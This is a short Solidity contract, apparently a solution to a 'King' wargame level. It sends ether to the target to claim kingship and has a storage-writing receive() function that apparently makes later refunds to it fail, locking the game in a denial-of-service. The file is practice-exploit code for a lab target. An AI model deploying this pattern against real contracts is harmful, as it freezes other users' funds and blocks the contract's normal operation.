// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";

contract KingSolver {

  address king;
  uint256 data;

  constructor(address _king) {
    king = _king;
  }

  function setKing() public payable {
    payable(king).call{value: msg.value}("");
  }

  receive() external payable {
    data = 1;
  } 
}